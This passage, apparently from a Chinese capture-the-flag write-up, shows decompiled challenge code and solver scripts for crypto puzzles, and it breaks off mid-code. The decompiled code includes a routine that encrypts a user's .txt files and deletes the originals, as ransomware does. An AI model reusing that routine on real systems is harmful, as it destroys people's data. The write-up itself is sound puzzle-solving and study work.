        plaintext <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    
    ciphertext <span class="token operator">=</span> sm4_encrypt<span class="token punctuation">(</span>key<span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span>
    
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">resource_path</span><span class="token punctuation">(</span>relative_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>sys<span class="token punctuation">,</span> <span class="token string">'frozen'</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        base_path <span class="token operator">=</span> sys<span class="token punctuation">.</span>_MEIPASS
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        base_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>base_path<span class="token punctuation">,</span> relative_path<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encrypt_directory</span><span class="token punctuation">(</span>directory<span class="token punctuation">,</span> sm4_key<span class="token punctuation">,</span> extensions<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">".txt"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>directory<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Directory does not exist: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>directory<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        <span class="token keyword">return</span>
    
    <span class="token keyword">for</span> root<span class="token punctuation">,</span> _<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>directory<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>ext<span class="token punctuation">)</span> <span class="token keyword">for</span> ext <span class="token keyword">in</span> extensions<span class="token punctuation">)</span><span class="token punctuation">:</span>
                input_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>
                output_path <span class="token operator">=</span> input_path <span class="token operator">+</span> <span class="token string">".enc"</span>
                
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    sm4_encrypt_file<span class="token punctuation">(</span>input_path<span class="token punctuation">,</span> output_path<span class="token punctuation">,</span> sm4_key<span class="token punctuation">)</span>
                    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>input_path<span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Encrypted: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>input_path<span class="token punctuation">&#125;</span></span><span class="token string"> -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>output_path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error encrypting </span><span class="token interpolation"><span class="token punctuation">&#123;</span>input_path<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        save_ntru_keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
        poly_str <span class="token operator">=</span> read_polynomial_from_file<span class="token punctuation">(</span><span class="token string">"priv_key.txt"</span><span class="token punctuation">)</span>
        poly_terms <span class="token operator">=</span> terms<span class="token punctuation">(</span>poly_str<span class="token punctuation">)</span>
        sm4_key <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>poly_terms<span class="token punctuation">)</span>
        user_name <span class="token operator">=</span> os<span class="token punctuation">.</span>getlogin<span class="token punctuation">(</span><span class="token punctuation">)</span>
        target_dir <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">"C:\Users"</span><span class="token punctuation">,</span> user_name<span class="token punctuation">,</span> <span class="token string">"Desktop"</span><span class="token punctuation">,</span> <span class="token string">"test_files"</span><span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>target_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
            os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Created directory: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>target_dir<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
            
        txt_files <span class="token operator">=</span> <span class="token punctuation">[</span>f <span class="token keyword">for</span> f <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>target_dir<span class="token punctuation">)</span> 
                    <span class="token keyword">if</span> f<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.txt'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isfile<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        
        <span class="token keyword">if</span> <span class="token keyword">not</span> txt_files<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No .txt files found in directory"</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span>
            
        <span class="token keyword">for</span> txt_file <span class="token keyword">in</span> txt_files<span class="token punctuation">:</span>
            file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>target_dir<span class="token punctuation">,</span> txt_file<span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    test_data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
                
                ciphertext <span class="token operator">=</span> sm4_encrypt<span class="token punctuation">(</span>sm4_key<span class="token punctuation">,</span> test_data<span class="token punctuation">)</span>
                encrypted_path <span class="token operator">=</span> file_path <span class="token operator">+</span> <span class="token string">'.enc'</span>
                
                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>encrypted_path<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error processing </span><span class="token interpolation"><span class="token punctuation">&#123;</span>txt_file<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
                
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Fatal error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>

<p>发现将是多项式m转换为SM4密钥加密，p，d&#x3D;3本来应该对enc多项式取模获得m，但是发现反编译出的文件有enc.txt和pub_key.txt，其中enc.txt里有两个多项式，使用第二个居然可以直接解密。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> gmssl <span class="token keyword">import</span> sm4
<span class="token keyword">import</span> binascii
<span class="token keyword">import</span> re

<span class="token keyword">def</span> <span class="token function">terms</span><span class="token punctuation">(</span>poly_str<span class="token punctuation">)</span><span class="token punctuation">:</span>
    terms <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    pattern <span class="token operator">=</span> <span class="token string">r'([+-]?\s*x\^?\d*|[-+]?\s*\d+)'</span>
    matches <span class="token operator">=</span> re<span class="token punctuation">.</span>finditer<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> poly_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    <span class="token keyword">for</span> <span class="token keyword">match</span> <span class="token keyword">in</span> matches<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">)</span>
        term <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> term <span class="token operator">==</span> <span class="token string">'+x'</span> <span class="token keyword">or</span> term <span class="token operator">==</span> <span class="token string">'x'</span><span class="token punctuation">:</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> term <span class="token operator">==</span> <span class="token string">'-x'</span><span class="token punctuation">:</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">'x^'</span> <span class="token keyword">in</span> term<span class="token punctuation">:</span>
            coeff_part <span class="token operator">=</span> term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            exponent <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x^'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> coeff_part <span class="token keyword">or</span> coeff_part <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token number">1</span>
            <span class="token keyword">elif</span> coeff_part <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                coeff <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>coeff_part<span class="token punctuation">)</span>
            terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span>coeff <span class="token operator">*</span> exponent<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">'x'</span> <span class="token keyword">in</span> term<span class="token punctuation">:</span>
            coeff_part <span class="token operator">=</span> term<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> coeff_part <span class="token keyword">or</span> coeff_part <span class="token operator">==</span> <span class="token string">'+'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">elif</span> coeff_part <span class="token operator">==</span> <span class="token string">'-'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>coeff_part<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> term <span class="token operator">==</span> <span class="token string">'+1'</span> <span class="token keyword">or</span> term <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                terms<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0</span><span class="token punctuation">)</span>
    
    <span class="token keyword">return</span> terms

<span class="token comment"># 解密函数</span>
<span class="token keyword">def</span> <span class="token function">sm4_decrypt</span><span class="token punctuation">(</span>key_hex<span class="token punctuation">,</span> ciphertext_hex<span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>key_hex<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cipher<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>key<span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_DECRYPT<span class="token punctuation">)</span>
    ciphertext <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>ciphertext_hex<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
    plaintext <span class="token operator">=</span> cipher<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>
    <span class="token keyword">return</span> plaintext

<span class="token keyword">def</span> <span class="token function">sm4_encrypt</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> plaintext<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token string">"SM4 key must be 16 bytes"</span>
    cipher <span class="token operator">=</span> sm4<span class="token punctuation">.</span>CryptSM4<span class="token punctuation">(</span><span class="token punctuation">)</span>
    cipher<span class="token punctuation">.</span>set_key<span class="token punctuation">(</span>key<span class="token punctuation">,</span> sm4<span class="token punctuation">.</span>SM4_ENCRYPT<span class="token punctuation">)</span>
    padded_plaintext <span class="token operator">=</span> pad<span class="token punctuation">(</span>plaintext<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> cipher<span class="token punctuation">.</span>crypt_ecb<span class="token punctuation">(</span>padded_plaintext<span class="token punctuation">)</span>


m<span class="token operator">=</span><span class="token string">"-x^48 - x^46 + x^45 + x^43 - x^42 + x^41 + x^40 + x^36 - x^35 + x^34 - x^33 + x^32 - x^30 + x^29 - x^28 - x^27 - x^26 - x^25 - x^23 - x^22 + x^21 + x^20 + x^19 + x^18 - x^17 - x^16 - x^15 - x^14 - x^12 + x^9 - x^7 - x^6 - x^5 - x^4 + x^3 - x + 1"</span>
m_ <span class="token operator">=</span> terms<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>m_<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">gen_key</span><span class="token punctuation">(</span>poly_terms<span class="token punctuation">)</span><span class="token punctuation">:</span>
    binary <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">128</span>
    <span class="token keyword">for</span> term <span class="token keyword">in</span> poly_terms<span class="token punctuation">:</span>
        exponent <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span>
        <span class="token keyword">if</span> term <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">and</span> exponent <span class="token operator">&lt;=</span> <span class="token number">127</span><span class="token punctuation">:</span>  
            binary<span class="token punctuation">[</span><span class="token number">127</span> <span class="token operator">-</span> exponent<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
    binary_str <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> binary<span class="token punctuation">)</span><span class="token punctuation">)</span>
    hex_key <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>binary_str<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> hex_key

hex_key <span class="token operator">=</span> gen_key<span class="token punctuation">(</span>m_<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>hex_key<span class="token punctuation">)</span>

encrypted_flag <span class="token operator">=</span> <span class="token string">"bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835"</span>
flag <span class="token operator">=</span> sm4_decrypt<span class="token punctuation">(</span>hex_key<span class="token punctuation">,</span> encrypted_flag<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Decrypted Flag:"</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span></code></pre>

<p>XYCTF{Crypto0_can_n0t_So1ve_it}</p>
<h3 id="reed"><a href="#reed" class="headerlink" title="reed"></a>reed</h3><p>题目给出一个基于random的随机数生成器</p>
<p>但是观察密文前两组是一样的，是同一个字符，根据出题人给出的其他参数，推测flag前几位是114514</p>
<p>有两个不一样的m即可两组enc相减乘m差值的逆元获得a，即可获得a，b。解密即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> string
<span class="token keyword">import</span> random

table <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_letters <span class="token operator">+</span> string<span class="token punctuation">.</span>digits

r <span class="token operator">=</span> random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">class</span> <span class="token class-name">PRNG</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> seed<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1145140</span>
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">19198100</span>
        random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        x <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span>self<span class="token punctuation">.</span>a<span class="token punctuation">,</span> self<span class="token punctuation">.</span>b<span class="token punctuation">)</span>
        random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>x <span class="token operator">**</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> x
    
    <span class="token keyword">def</span> <span class="token function">round</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">:</span>
            x <span class="token operator">=</span> self<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> x

<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>
    c <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>a <span class="token operator">*</span> table<span class="token punctuation">.</span>index<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token operator">+</span> b<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">19198111</span> <span class="token keyword">for</span> m <span class="token keyword">in</span> msg<span class="token punctuation">]</span>
    <span class="token keyword">return</span> c
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>

enc<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">9474070</span><span class="token punctuation">,</span> <span class="token number">15547185</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">9474070</span><span class="token punctuation">,</span> <span class="token number">6914981</span><span class="token punctuation">,</span> <span class="token number">5936215</span><span class="token punctuation">,</span> <span class="token number">1042385</span><span class="token punctuation">,</span> <span class="token number">841866</span><span class="token punctuation">,</span> <span class="token number">13966862</span><span class="token punctuation">,</span> <span class="token number">10051798</span><span class="token punctuation">,</span> <span class="token number">3978683</span><span class="token punctuation">,</span> <span class="token number">5936215</span><span class="token punctuation">,</span> <span class="token number">17103679</span><span class="token punctuation">,</span> <span class="token number">15146147</span><span class="token punctuation">,</span> <span class="token number">5936215</span><span class="token punctuation">,</span> <span class="token number">9073032</span><span class="token punctuation">,</span> <span class="token number">9073032</span><span class="token punctuation">,</span> <span class="token number">3978683</span><span class="token punctuation">,</span> <span class="token number">13966862</span><span class="token punctuation">,</span> <span class="token number">14945628</span><span class="token punctuation">,</span> <span class="token number">17103679</span><span class="token punctuation">,</span> <span class="token number">12988096</span><span class="token punctuation">,</span> <span class="token number">841866</span><span class="token punctuation">,</span> <span class="token number">2999917</span><span class="token punctuation">,</span> <span class="token number">3978683</span><span class="token punctuation">,</span> <span class="token number">2021151</span><span class="token punctuation">,</span> <span class="token number">9073032</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">1443423</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">1443423</span><span class="token punctuation">,</span> <span class="token number">14568419</span><span class="token punctuation">,</span> <span class="token number">10452836</span><span class="token punctuation">,</span> <span class="token number">4379721</span><span class="token punctuation">]</span>

prng <span class="token operator">=</span> PRNG<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

flag<span class="token operator">=</span><span class="token string">'114'</span>

encc<span class="token operator">=</span>enc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>enc<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
inv_e<span class="token operator">=</span>inverse<span class="token punctuation">(</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token operator">-</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">19198111</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>inv_e<span class="token punctuation">)</span>

amod<span class="token operator">=</span><span class="token punctuation">(</span>enc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>enc<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span>inv_e<span class="token operator">%</span><span class="token number">19198111</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>amod<span class="token punctuation">)</span>
inv_a<span class="token operator">=</span>inverse<span class="token punctuation">(</span>amod<span class="token punctuation">,</span><span class="token number">19198111</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>inv_a<span class="token punctuation">)</span>
b<span class="token operator">=</span>enc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>amod<span class="token operator">*</span>table<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">19198111</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> enc<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">-</span>b<span class="token punctuation">)</span><span class="token operator">*</span>inv_a<span class="token operator">%</span><span class="token number">19198111</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>


</code></pre>

<p>114514fixedpointissodangerous1919810</p>
<h3 id="choice"><a href="#choice" class="headerlink" title="choice"></a>choice</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> bytes_to_long
<span class="token keyword">from</span> random <span class="token keyword">import</span> Random
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag

<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'XYCTF&#123;'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">b'&#125;'</span><span class="token punctuation">)</span>
flag <span class="token operator">=</span> flag<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

msg <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
rand <span class="token operator">=</span> Random<span class="token punctuation">(</span><span class="token punctuation">)</span>
test <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.py'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'enc = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>msg <span class="token operator">^</span> rand<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>bit_length<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\nr = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">[</span>rand<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>test<span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2496</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token 